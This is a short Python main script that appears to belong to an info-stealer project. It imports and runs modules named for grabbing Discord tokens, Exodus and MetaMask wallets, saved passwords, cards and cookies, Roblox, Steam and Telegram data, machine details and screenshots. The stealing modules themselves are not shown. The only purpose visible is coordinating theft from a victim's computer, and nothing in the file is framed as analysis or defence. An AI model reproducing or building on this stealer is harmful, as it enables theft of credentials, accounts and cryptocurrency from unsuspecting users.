from scripts.exodus import exo
from scripts.discord import find_tokens
from scripts.machine import machineinfo
from scripts.metamask import yea
from scripts.passwords_cards_cookies import mainpass
from scripts.roblox import rbxsteal
from scripts.screenshot import screen
from scripts.steam import steam_st
from scripts.telegram import telegram

def main(): # or u can create a CLASS in the scripts / here
  find_tokens()
  exo() 
  machineinfo()
  yea()
  mainpass()
  rbxsteal()
  screen()
  steam_st()
  telegram()
  
if __name__ == "__main__":
  main()
